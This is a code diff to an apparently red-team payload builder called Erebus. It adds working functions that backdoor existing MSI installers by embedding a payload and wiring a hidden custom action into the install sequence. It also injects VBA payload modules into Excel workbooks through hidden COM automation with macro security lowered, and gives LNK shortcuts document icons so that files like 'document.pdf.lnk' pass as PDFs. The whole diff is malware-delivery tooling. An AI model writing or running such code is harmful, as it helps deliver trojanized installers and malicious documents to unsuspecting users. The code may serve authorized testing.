@@ -17,6 +17,8 @@ then invokes this helper on the host Windows system to compile/create native art
 import os
 import sys
 import json
+import random
+import string
 import subprocess
 import argparse
 import tempfile
@@ -27,6 +29,8 @@ import shlex
 from pathlib import Path
 from typing import Dict, Any, Optional, Tuple
 import logging
+
+from modules.compile_xll import compile_xll, XllCompiler
 
 # Setup logging
 logging.basicConfig(
@@ -42,6 +46,7 @@ class WindowsCompiler:
     # Supported compilers and their detection methods
     COMPILER_PATHS = {
         'MSVC': [
+            'C:\\Program Files\\Microsoft Visual Studio\\18\\Community\\VC\\Tools\\MSVC',
             'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
             'C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC',
             'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
@@ -153,6 +158,7 @@ class WindowsCompiler:
         if not cl_exe:
             # Try common paths
             common_paths = [
+                'C:\\Program Files\\Microsoft Visual Studio\\18\\Community\\VC\\Tools\\MSVC',
                 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
                 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
             ]
@@ -401,6 +407,56 @@ class ExcelHelper:
 class LnkHelper:
     """Helper class for Windows LNK shortcut creation."""
 
+    # Maps common file extensions to (icon_dll_path, icon_index) tuples.
+    # Icon indices are well-known offsets inside standard Windows system DLLs.
+    EXTENSION_ICONS: Dict[str, Tuple[str, int]] = {
+        # Documents
+        '.pdf':  ('%SystemRoot%\\system32\\shell32.dll', 222),
+        '.doc':  ('%SystemRoot%\\system32\\shell32.dll', 1),
+        '.docx': ('%SystemRoot%\\system32\\shell32.dll', 1),
+        '.xls':  ('%SystemRoot%\\system32\\shell32.dll', 2),
+        '.xlsx': ('%SystemRoot%\\system32\\shell32.dll', 2),
+        '.ppt':  ('%SystemRoot%\\system32\\shell32.dll', 3),
+        '.pptx': ('%SystemRoot%\\system32\\shell32.dll', 3),
+        '.txt':  ('%SystemRoot%\\system32\\shell32.dll', 152),
+        '.rtf':  ('%SystemRoot%\\system32\\shell32.dll', 152),
+        # Images
+        '.jpg':  ('%SystemRoot%\\system32\\shell32.dll', 325),
+        '.jpeg': ('%SystemRoot%\\system32\\shell32.dll', 325),
+        '.png':  ('%SystemRoot%\\system32\\shell32.dll', 325),
+        '.gif':  ('%SystemRoot%\\system32\\shell32.dll', 325),
+        '.bmp':  ('%SystemRoot%\\system32\\shell32.dll', 325),
+        '.tiff': ('%SystemRoot%\\system32\\shell32.dll', 325),
+        # Video
+        '.mp4':  ('%SystemRoot%\\system32\\shell32.dll', 116),
+        '.avi':  ('%SystemRoot%\\system32\\shell32.dll', 116),
+        '.mkv':  ('%SystemRoot%\\system32\\shell32.dll', 116),
+        '.mov':  ('%SystemRoot%\\system32\\shell32.dll', 116),
+        '.wmv':  ('%SystemRoot%\\system32\\wmploc.dll',  0),
+        # Audio
+        '.mp3':  ('%SystemRoot%\\system32\\shell32.dll', 115),
+        '.wav':  ('%SystemRoot%\\system32\\shell32.dll', 115),
+        '.flac': ('%SystemRoot%\\system32\\shell32.dll', 115),
+        '.aac':  ('%SystemRoot%\\system32\\shell32.dll', 115),
+        # Archives
+        '.zip':  ('%SystemRoot%\\system32\\shell32.dll', 326),
+        '.rar':  ('%SystemRoot%\\system32\\shell32.dll', 326),
+        '.7z':   ('%SystemRoot%\\system32\\shell32.dll', 326),
+        '.tar':  ('%SystemRoot%\\system32\\shell32.dll', 326),
+        # Web / code
+        '.html': ('%SystemRoot%\\system32\\shell32.dll', 220),
+        '.htm':  ('%SystemRoot%\\system32\\shell32.dll', 220),
+        '.xml':  ('%SystemRoot%\\system32\\shell32.dll', 152),
+        '.json': ('%SystemRoot%\\system32\\shell32.dll', 152),
+        '.py':   ('%SystemRoot%\\system32\\shell32.dll', 152),
+        '.js':   ('%SystemRoot%\\system32\\shell32.dll', 152),
+        # Executables / shortcuts (rarely needed but included for completeness)
+        '.exe':  ('%SystemRoot%\\system32\\shell32.dll', 2),
+        '.dll':  ('%SystemRoot%\\system32\\shell32.dll', 72),
+        '.bat':  ('%SystemRoot%\\system32\\shell32.dll', 152),
+        '.ps1':  ('%SystemRoot%\\system32\\shell32.dll', 152),
+    }
+
     def __init__(self):
         """Initialize LNK helper with required libraries."""
         self.logger = logging.getLogger('LnkHelper')
@@ -411,6 +467,35 @@ class LnkHelper:
         except ImportError as e:
             self.logger.warning(f"LNK helper requires pylnk3: {e}")
             self.pylnk3 = None
+
+    def resolve_icon_for_filename(self, filename: str) -> Tuple[Optional[str], int]:
+        """
+        Determine the best icon for a decoy LNK based on the filename.
+
+        Strips a trailing '.lnk' extension first so that a file named
+        'document.pdf.lnk' is treated as a PDF.  Falls back to the generic
+        file icon (shell32.dll index 0) when no mapping is found.
+
+        Args:
+            filename: The LNK file name or full path (e.g. 'decoy.pdf.lnk').
+
+        Returns:
+            Tuple of (icon_dll_path, icon_index).
+        """
+        name = Path(filename).name.lower()
+
+        # Strip .lnk wrapper to expose the decoy extension
+        if name.endswith('.lnk'):
+            name = name[:-4]
+
+        ext = Path(name).suffix.lower()
+        if ext in self.EXTENSION_ICONS:
+            icon_path, icon_index = self.EXTENSION_ICONS[ext]
+            self.logger.info(f"Resolved icon for '{ext}': {icon_path} @ {icon_index}")
+            return icon_path, icon_index
+
+        self.logger.info(f"No icon mapping for '{ext}', using generic file icon")
+        return '%SystemRoot%\\system32\\shell32.dll', 0
 
     def set_file_hidden(self, file_path: str) -> bool:
         """
@@ -471,13 +556,17 @@ class LnkHelper:
                 self.logger.error("pylnk3 not available, cannot create LNK")
                 return False
 
+            # Auto-resolve icon from output filename when not explicitly provided
+            if icon_path is None:
+                icon_path, icon_index = self.resolve_icon_for_filename(output_path)
+
             lnk = self.pylnk3.Lnk()
             lnk = self.pylnk3.for_file(
                 target_binary,
                 output_path,
                 arguments,
                 description,
-                icon_path or target_binary,
+                icon_path,
                 icon_index
             )
 
@@ -498,13 +587,21 @@ class MSIHelper:
     def __init__(self):
         """Initialize MSI helper with required libraries."""
         self.logger = logging.getLogger('MSIHelper')
-        
+
+        self.msilib = None
+        self._OpenDatabase = None
+        self._MSIDBOPEN_TRANSACT = None
+        self._CreateRecord = None
         try:
             import msilib
+            import importlib
+            _msi = importlib.import_module("_msi")
             self.msilib = msilib
+            self._OpenDatabase = getattr(_msi, "OpenDatabase")
+            self._MSIDBOPEN_TRANSACT = getattr(_msi, "MSIDBOPEN_TRANSACT")
+            self._CreateRecord = getattr(_msi, "CreateRecord")
         except ImportError:
             self.logger.warning("MSI helper requires msilib (Windows only): Windows Python install required")
-            self.msilib = None
     
     def backdoor_msi(
         self,
@@ -519,139 +616,440 @@ class MSIHelper:
     ) -> bool:
         """
         Backdoor an existing MSI installer by injecting a custom action.
-        
+
+        The payload is embedded in the Binary table and wired into
+        InstallExecuteSequence to fire just before InstallFinalize.
+
         Args:
             source_msi: Path to source MSI file
-            payload_path: Path to payload executable/DLL
+            payload_path: Path to payload executable/DLL/script
             output_path: Path where backdoored MSI will be saved
-            attack_type: Attack vector (execute, run-exe, load-dll, dotnet, script)
-            entry_point: DLL export or script function name
-            command_args: Command line arguments
+            attack_type: Attack vector:
+                "execute"  - run a command string (cmd.exe /c ...)
+                "run-exe"  - extract EXE from Binary table and execute
+                "load-dll" - call a native DLL entry-point from Binary table
+                "dotnet"   - same as load-dll but for managed assemblies
+                "script"   - run VBScript/JScript from Binary table
+            entry_point: DLL export or script function name (required for
+                         load-dll / dotnet / script)
+            command_args: Command-line arguments (used by execute / run-exe)
             custom_action_name: Name for custom action (auto-generated if None)
-            condition: MSI execution condition (default: NOT REMOVE)
-        
+            condition: MSI condition expression (default: NOT REMOVE)
+
         Returns:
             True if successful, False otherwise
         """
         if not self.msilib:
             self.logger.error("MSI operations require Windows with msilib")
             return False
-        
+
+        assert self._OpenDatabase is not None
+        assert self._MSIDBOPEN_TRANSACT is not None
+        assert self._CreateRecord is not None
+
+        source_path = Path(source_msi)
+        payload_file = Path(payload_path)
+        output_file = Path(output_path)
+
+        if not source_path.exists():
+            self.logger.error(f"Source MSI not found: {source_msi}")
+            return False
+
+        if not payload_file.exists():
+            self.logger.error(f"Payload not found: {payload_path}")
+            return False
+
+        output_file.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(str(source_path), str(output_file))
+
+        if custom_action_name is None:
+            custom_action_name = ''.join(
+                random.choices(string.ascii_letters, k=8)
+            )
+
+        # binary_name is the stream key in the Binary table.
+        # For "execute" (command-string) there is no Binary stream needed.
+        binary_name = ''.join(
+            random.choices(string.ascii_letters + string.digits, k=10)
+        )
+
+        # --- Resolve action type-code and target string --------------------
+        # MSI CustomAction SDK type codes:
+        #   34   = EXE launched from directory (command-line execution)
+        #   65   = DLL entry-point from Binary table
+        #   1218 = EXE extracted from Binary table, deferred
+        #   1250 = Deferred command-line execution, impersonated
+        #   70   = VBScript from Binary table
+        #   69   = JScript from Binary table
+        needs_binary_stream = True
+        if attack_type == "execute":
+            # Type 34: run an EXE via a command string; Source = directory
+            # property (can be empty), Target = full command.
+            # Using type 226 (immediate, impersonated) so it fires reliably.
+            action_type_code = 226
+            ca_source = ""
+            target = command_args
+            needs_binary_stream = False
+        elif attack_type == "run-exe":
+            # Type 1218: extract EXE from Binary table and run deferred.
+            action_type_code = 1218
+            ca_source = binary_name
+            target = command_args
+        elif attack_type in ("load-dll", "dotnet"):
+            # Type 65: call DLL entry-point from Binary table.
+            action_type_code = 65
+            ca_source = binary_name
+            target = entry_point if entry_point else "DllEntry"
+        elif attack_type == "script":
+            ext = payload_file.suffix.lower()
+            if ext in (".vbs", ".vbe"):
+                action_type_code = 70   # VBScript from Binary table
+            elif ext in (".js", ".jse"):
+                action_type_code = 69   # JScript from Binary table
+            else:
+                self.logger.error(
+                    f"Script vector requires .vbs/.vbe/.js/.jse payload, got: {ext}"
+                )
+                return False
+            if not entry_point:
+                self.logger.error("Script vector requires --entry-point")
+                return False
+            ca_source = binary_name
+            target = entry_point
+        else:
+            self.logger.error(f"Unknown attack_type: {attack_type!r}")
+            return False
+
+        db = None
         try:
-            import sys
-            if sys.platform != "win32":
-                self.logger.error("MSI backdooring is only supported on Windows")
-                return False
-            
-            from pathlib import Path
-            source_path = Path(source_msi)
-            payload_file = Path(payload_path)
-            output_file = Path(output_path)
-            
-            if not source_path.exists():
-                self.logger.error(f"Source MSI not found: {source_msi}")
-                return False
-            
-            if not payload_file.exists():
-                self.logger.error(f"Payload not found: {payload_path}")
-                return False
-            
-            # Create output directory
-            output_file.parent.mkdir(parents=True, exist_ok=True)
-            
-            # Copy source MSI to output location
-            import shutil
-            shutil.copy2(str(source_path), str(output_file))
-            
-            # Generate custom action name if not provided
-            if custom_action_name is None:
-                import random, string
-                custom_action_name = ''.join(random.choices(string.ascii_letters, k=8))
-            
-            # Open MSI database for modification
-            try:
-                db = self.msilib.OpenDatabase(str(output_file), self.msilib.MSIDBOPEN_TRANSACT)
-            except Exception as e:
-                self.logger.error(f"Failed to open MSI database: {e}")
-                return False
-            
-            # Generate binary name
-            import random, string
-            binary_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-            
-            # Step 1: Add payload to Binary table
-            try:
-                binary_insert = f"INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?)"
-                view = db.OpenView(binary_insert)
-                record = self.msilib.CreateRecord(1)
-                
-                # Read payload file
-                with open(payload_file, 'rb') as f:
-                    payload_data = f.read()
-                
-                record.SetStream(1, payload_path)
-                view.Execute(record)
+            db = self._OpenDatabase(
+                str(output_file), self._MSIDBOPEN_TRANSACT
+            )
+        except Exception as e:
+            self.logger.error(f"Failed to open MSI database: {e}")
+            return False
+
+        try:
+            # Step 1: Embed payload into Binary table (skip for pure command exec)
+            if needs_binary_stream:
+                sql = (
+                    f"INSERT INTO Binary (Name, Data) "
+                    f"VALUES ('{binary_name}', ?)"
+                )
+                view = db.OpenView(sql)
+                rec = self._CreateRecord(1)
+                rec.SetStream(1, str(payload_file))   # must be str, not Path
+                view.Execute(rec)
                 view.Close()
-                
-                self.logger.info(f"Injected payload binary: {binary_name}")
-            except Exception as e:
-                self.logger.error(f"Failed to add binary to MSI: {e}")
-                db.Close()
-                return False
-            
-            # Step 2: Add CustomAction entry
-            try:
-                action_type = 1234  # Default deferred execution
-                
-                # Map attack types to action codes
-                if attack_type == "execute":
-                    action_type = 1250  # Deferred, impersonate
-                    target = command_args
-                elif attack_type == "run-exe":
-                    action_type = 1218  # Run EXE from Binary
-                    target = command_args
-                elif attack_type in ["load-dll", "dotnet"]:
-                    action_type = 65   # DLL entry point
-                    target = entry_point if entry_point else "DllEntry"
-                elif attack_type == "script":
-                    action_type = 1126  # VBScript embedded
-                    target = entry_point if entry_point else ""
-                
-                ca_insert = f"INSERT INTO CustomAction (Action, Type, Target) VALUES ('{custom_action_name}', {action_type}, '{target}')"
-                view = db.OpenView(ca_insert)
-                view.Execute()
-                view.Close()
-                
-                self.logger.info(f"Added custom action: {custom_action_name}")
-            except Exception as e:
-                self.logger.error(f"Failed to add custom action: {e}")
-                db.Close()
-                return False
-            
-            # Step 3: Add to InstallExecuteSequence
-            try:
-                sequence_insert = f"INSERT INTO InstallExecuteSequence (Action, Sequence, Condition) VALUES ('{custom_action_name}', 6500, '{condition}')"
-                view = db.OpenView(sequence_insert)
-                view.Execute()
-                view.Close()
-                
-                self.logger.info(f"Added to execute sequence with condition: {condition}")
-            except Exception as e:
-                self.logger.warning(f"Note: Could not add to sequence (may already exist): {e}")
-            
-            # Commit changes and close database
-            try:
-                db.Commit()
-                db.Close()
-                self.logger.info(f"Successfully backdoored MSI: {output_path}")
-                return True
-            except Exception as e:
-                self.logger.error(f"Failed to commit MSI changes: {e}")
-                return False
-        
+                self.logger.info(f"Embedded payload stream: {binary_name}")
+
+            # Step 2: Insert CustomAction row
+            # Schema: Action(s72), Type(i2), Source(S64), Target(S0)
+            ca_sql = (
+                f"INSERT INTO CustomAction (Action, Type, Source, Target) "
+                f"VALUES ('{custom_action_name}', {action_type_code}, "
+                f"'{ca_source}', '{target}')"
+            )
+            view = db.OpenView(ca_sql)
+            view.Execute(None)
+            view.Close()
+            self.logger.info(
+                f"Added CustomAction '{custom_action_name}' "
+                f"(type {action_type_code})"
+            )
+
+            # Step 3: Find a free sequence slot between InstallInitialize and
+            # InstallFinalize so we don't collide with existing actions.
+            seq_slot = self._find_free_sequence_slot(db)
+            self.logger.info(f"Using sequence slot: {seq_slot}")
+
+            # Schema: Action(s72), Condition(S255), Sequence(I2)
+            seq_sql = (
+                f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
+                f"VALUES ('{custom_action_name}', '{condition}', {seq_slot})"
+            )
+            view = db.OpenView(seq_sql)
+            view.Execute(None)
+            view.Close()
+            self.logger.info(
+                f"Wired into InstallExecuteSequence at slot {seq_slot}"
+            )
+
+            db.Commit()
+            db.Close()
+            self.logger.info(f"Successfully backdoored MSI: {output_path}")
+            return True
+
         except Exception as e:
             self.logger.error(f"MSI backdooring error: {e}")
+            try:
+                db.Close()   # close without commit - discards all changes
+            except Exception:
+                pass
             return False
+
+    def _find_free_sequence_slot(self, db, after_seq: int = 6400, before_seq: int = 6600) -> int:
+        """
+        Walk InstallExecuteSequence and return an unused slot number that sits
+        between InstallInitialize (~1500) and InstallFinalize (~6600).
+
+        Falls back to 6599 if the table cannot be read.
+        """
+        try:
+            view = db.OpenView("SELECT Sequence FROM InstallExecuteSequence")
+            view.Execute(None)
+            occupied = set()
+            while True:
+                rec = view.Fetch()
+                if rec is None:
+                    break
+                try:
+                    occupied.add(rec.GetInteger(1))
+                except Exception:
+                    pass
+            view.Close()
+            for slot in range(before_seq - 1, after_seq, -1):
+                if slot not in occupied:
+                    return slot
+        except Exception as e:
+            self.logger.warning(f"Could not scan sequence table: {e}")
+        return 6599
+
+
+# ============================================================================
+# ExcelMaldocHelper - VBA injection into XLSX/XLAM via COM (inlined)
+# ============================================================================
+
+# Excel file format constants (XlFileFormat enum)
+_XL_FORMAT_XLSM = 52   # xlOpenXMLWorkbookMacroEnabled  (.xlsm)
+_XL_FORMAT_XLAM = 55   # xlOpenXMLAddIn                 (.xlam)
+
+# VBA module type constants
+_VBA_MODULE_TYPE_STANDARD = 1   # vbext_ct_StdModule
+
+
+def _com_available() -> bool:
+    """Return True if win32com.client can be imported (Windows + pywin32)."""
+    try:
+        import win32com.client  # noqa: F401
+        return True
+    except ImportError:
+        return False
+
+
+def _get_excel_app():
+    """Create a hidden Excel application COM object."""
+    if not _com_available():
+        raise RuntimeError(
+            "pywin32 not found.  "
+            "Install it with: pip install pywin32  (Windows only)"
+        )
+
+    import win32com.client
+
+    try:
+        excel = win32com.client.Dispatch("Excel.Application")
+    except Exception as exc:
+        raise RuntimeError(f"Failed to start Excel via COM: {exc}") from exc
+
+    excel.Visible = False
+    excel.DisplayAlerts = False
+    excel.AutomationSecurity = 1   # msoAutomationSecurityLow - allow macros to be added
+    return excel
+
+
+def _inject_via_com(
+    vba_code: str,
+    output_path: str,
+    source_excel: Optional[str],
+    fmt: str,
+    module_name: str = "ErebusPayload",
+    overwrite_module: bool = True,
+) -> Tuple[bool, str]:
+    xl_format = {
+        "xlsm": _XL_FORMAT_XLSM,
+        "xlsx": _XL_FORMAT_XLSM,
+        "xlam": _XL_FORMAT_XLAM,
+    }.get(fmt.lower(), _XL_FORMAT_XLSM)
+
+    out = Path(output_path).resolve()
+    out.parent.mkdir(parents=True, exist_ok=True)
+
+    ext_map = {_XL_FORMAT_XLSM: ".xlsm", _XL_FORMAT_XLAM: ".xlam"}
+    correct_ext = ext_map[xl_format]
+    if out.suffix.lower() != correct_ext:
+        out = out.with_suffix(correct_ext)
+        logger.info(f"Adjusted output extension to {correct_ext}: {out.name}")
+
+    excel = None
+    wb = None
+    try:
+        excel = _get_excel_app()
+
+        if source_excel:
+            src = Path(source_excel).resolve()
+            if not src.exists():
+                return False, f"Source Excel file not found: {source_excel}"
+            wb = excel.Workbooks.Open(str(src))
+            logger.info(f"Opened source workbook: {src.name}")
+        else:
+            wb = excel.Workbooks.Add()
+            logger.info("Created new blank workbook")
+
+        try:
+            vba_project = wb.VBProject
+        except Exception as exc:
+            return False, (
+                f"Cannot access VBA project: {exc}.  "
+                "Ensure 'Trust access to the VBA project object model' is enabled "
+                "in Excel > Options > Trust Center > Macro Settings."
+            )
+
+        components = vba_project.VBComponents
+
+        if overwrite_module:
+            for comp in components:
+                if comp.Name == module_name:
+                    try:
+                        components.Remove(comp)
+                        logger.info(f"Removed existing module '{module_name}'")
+                    except Exception:
+                        pass
+                    break
+
+        new_mod = components.Add(_VBA_MODULE_TYPE_STANDARD)
+        new_mod.Name = module_name
+        new_mod.CodeModule.AddFromString(vba_code)
+        logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
+
+        wb.SaveAs(str(out), FileFormat=xl_format)
+        logger.info(f"Saved workbook as {out.name} (format {xl_format})")
+
+        wb.Close(SaveChanges=False)
+        wb = None
+        excel.Quit()
+        excel = None
+
+        if not out.exists():
+            return False, "Excel saved cleanly but output file not found on disk"
+
+        size = out.stat().st_size
+        logger.info(f"Output: {out}  ({size:,} bytes)")
+        return True, str(out)
+
+    except Exception as exc:
+        logger.error(f"COM injection failed: {exc}")
+        return False, str(exc)
+    finally:
+        try:
+            if wb is not None:
+                wb.Close(SaveChanges=False)
+        except Exception:
+            pass
+        try:
+            if excel is not None:
+                excel.Quit()
+        except Exception:
+            pass
+
+
+def _inject_via_zip(
+    vba_code: str,
+    output_path: str,
+    source_excel: Optional[str],
+    fmt: str,
+) -> Tuple[bool, str]:
+    """ZIP-based VBA injection fallback (Linux / no Excel)."""
+    try:
+        _root = Path(__file__).resolve().parent.parent.parent.parent
+        sys.path.insert(0, str(_root))
+
+        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
+        plugin = PayloadMalDocsPlugin()
+
+        out = Path(output_path)
+        if source_excel:
+            result_path = plugin.backdoor_existing_excel(
+                source_excel=source_excel,
+                vba_payload=vba_code,
+                output_path=str(out),
+            )
+        else:
+            result_path = plugin.generate_excel_payload(
+                payload_path=str(out.parent),
+                vba_payload=vba_code,
+                output_path=str(out),
+            )
+
+        if result_path and Path(result_path).exists():
+            return True, str(result_path)
+        return False, "ZIP injection produced no output"
+
+    except Exception as exc:
+        return False, f"ZIP fallback failed: {exc}"
+
+
+class ExcelMaldocHelper:
+    """High-level helper for XLSX / XLAM maldoc creation via COM automation."""
+
+    def __init__(self, prefer_com: bool = True):
+        self._use_com = prefer_com and _com_available()
+        if not self._use_com:
+            logger.warning(
+                "pywin32 / Excel not available - using ZIP-based fallback.  "
+                "For reliable VBA injection run on a Windows host with pywin32 installed."
+            )
+
+    def inject_vba(
+        self,
+        vba_code: str,
+        output_path: str,
+        source_excel: Optional[str] = None,
+        fmt: str = "xlsm",
+        module_name: str = "ErebusPayload",
+    ) -> Tuple[bool, str]:
+        if self._use_com:
+            logger.info("Using COM-based Excel injection")
+            return _inject_via_com(
+                vba_code=vba_code,
+                output_path=output_path,
+                source_excel=source_excel,
+                fmt=fmt,
+                module_name=module_name,
+            )
+        else:
+            logger.info("Using ZIP-based Excel injection (fallback)")
+            return _inject_via_zip(
+                vba_code=vba_code,
+                output_path=output_path,
+                source_excel=source_excel,
+                fmt=fmt,
+            )
+
+    def from_bas_file(
+        self,
+        bas_path: str,
+        output_path: str,
+        source_excel: Optional[str] = None,
+        fmt: str = "xlsm",
+        module_name: str = "ErebusPayload",
+    ) -> Tuple[bool, str]:
+        bas = Path(bas_path)
+        if not bas.exists():
+            return False, f"VBA .bas file not found: {bas_path}"
+
+        try:
+            vba_code = bas.read_text(encoding="utf-8")
+        except Exception as exc:
+            return False, f"Could not read .bas file: {exc}"
+
+        return self.inject_vba(
+            vba_code=vba_code,
+            output_path=output_path,
+            source_excel=source_excel,
+            fmt=fmt,
+            module_name=module_name,
+        )
 
 
 def main():
@@ -663,8 +1061,8 @@ def main():
 
     parser.add_argument(
         'command',
-        choices=['xll', 'dll', 'verify', 'excel', 'lnk', 'msi'],
-        help='Build/create command to execute (xll/dll/verify for compilation, excel/lnk/msi for creation)'
+        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlam', 'lnk', 'msi'],
+        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlam/lnk/msi for creation)'
     )
 
     # Common arguments
@@ -701,6 +1099,21 @@ def main():
         help='Optimization level (default: Ox)'
     )
 
+    parser.add_argument(
+        '--extra-flags',
+        help='Extra compiler flags (space-separated, e.g. "/GS- /Gy")'
+    )
+
+    parser.add_argument(
+        '--defines',
+        help='Preprocessor defines (comma-separated, e.g. "NDEBUG,VER=2")'
+    )
+
+    parser.add_argument(
+        '--include-dirs',
+        help='Extra include directories (semicolon-separated)'
+    )
+
     # Arguments for Excel creation
     parser.add_argument(
         '--vba-code',
@@ -718,6 +1131,29 @@ def main():
         '--title',
         default='Workbook',
         help='Excel workbook title (default: Workbook)'
+    )
+
+    # Arguments for xlsx/xlam maldoc injection (COM-based, Windows host)
+    parser.add_argument(
+        '--bas-file',
+        help='Path to .bas VBA module file generated by the builder (required for xlsx/xlam)'
+    )
+
+    parser.add_argument(
+        '--source-excel',
+        help='Existing Excel file to backdoor (xlsx/xlam). Creates a blank workbook if omitted.'
+    )
+
+    parser.add_argument(
+        '--module-name',
+        default='ErebusPayload',
+        help='VBA module name to create inside the workbook (default: ErebusPayload)'
+    )
+
+    parser.add_argument(
+        '--no-com',
+        action='store_true',
+        help='Disable COM automation and use ZIP-based fallback (useful for testing on Linux)'
     )
 
     # Arguments for LNK creation
@@ -817,6 +1253,9 @@ def main():
     elif args.command == 'excel':
         # For excel: --source is input excel or VBA code, --title is workbook title
         pass  # --output is always required
+    elif args.command in ('xlsx', 'xlam'):
+        if not args.bas_file:
+            parser.error(f"--bas-file is required for {args.command} command")
     elif args.command == 'lnk':
         # For lnk: --target-binary is the target, other args are optional
         if not args.target_binary:
@@ -839,28 +1278,42 @@ def main():
     try:
         success = False
 
-        if args.command == 'xll':
-            compiler = WindowsCompiler(
-                compiler=args.compiler,
-                architecture=args.arch,
-                optimization=args.optimize,
-                verbose=args.verbose
-            )
-            success = compiler.compile_xll(args.source, args.output)
+        if args.command in ('xll', 'dll'):
+            # Parse optional extra-flags, defines, and include-dirs
+            extra_flags = shlex.split(args.extra_flags) if args.extra_flags else []
 
-        elif args.command == 'dll':
-            compiler = WindowsCompiler(
+            defines: Dict[str, Any] = {}
+            if args.defines:
+                for token in args.defines.split(','):
+                    token = token.strip()
+                    if '=' in token:
+                        k, v = token.split('=', 1)
+                        defines[k.strip()] = v.strip()
+                    else:
+                        defines[token] = None
+
+            include_dirs = (
+                [d.strip() for d in args.include_dirs.split(';') if d.strip()]
+                if args.include_dirs else []
+            )
+
+            ok, msg = compile_xll(
+                source_file=args.source,
+                output_path=args.output,
                 compiler=args.compiler,
                 architecture=args.arch,
                 optimization=args.optimize,
-                verbose=args.verbose
+                extra_flags=extra_flags,
+                defines=defines,
+                include_dirs=include_dirs,
+                verify=True,
             )
-            # DLL uses same compilation as XLL (both are DLLs)
-            success = compiler.compile_xll(args.source, args.output)
+            if not ok:
+                logger.error(f"XLL compilation failed: {msg}")
+            success = ok
 
         elif args.command == 'verify':
-            compiler = WindowsCompiler(verbose=args.verbose)
-            is_valid, error = compiler.verify_output(args.output)
+            is_valid, error = XllCompiler.verify_xll(args.output)
             success = is_valid
             if not is_valid:
                 logger.error(f"Verification failed: {error}")
@@ -879,6 +1332,23 @@ def main():
                     success = excel.create_blank_excel(args.output, args.title)
             except Exception as e:
                 logger.error(f"Excel creation failed: {e}")
+                success = False
+
+        elif args.command in ('xlsx', 'xlam'):
+            try:
+                helper = ExcelMaldocHelper(prefer_com=not args.no_com)
+                ok, msg = helper.from_bas_file(
+                    bas_path=args.bas_file,
+                    output_path=args.output,
+                    source_excel=args.source_excel,
+                    fmt=args.command,
+                    module_name=args.module_name,
+                )
+                if not ok:
+                    logger.error(f"Maldoc injection failed: {msg}")
+                success = ok
+            except Exception as e:
+                logger.error(f"Maldoc creation failed: {e}")
                 success = False
 
         elif args.command == 'lnk':
@@ -923,13 +1393,6 @@ def main():
 
         # Verify output and log results
         if success:
-            if args.command in ['xll', 'dll']:
-                compiler = WindowsCompiler(verbose=args.verbose)
-                is_valid, error = compiler.verify_output(args.output)
-                if not is_valid:
-                    logger.error(f"Output verification failed: {error}")
-                    success = False
-
             if success and Path(args.output).exists():
                 output_size = Path(args.output).stat().st_size
                 logger.info(f"Successfully created: {args.output} ({output_size} bytes)")
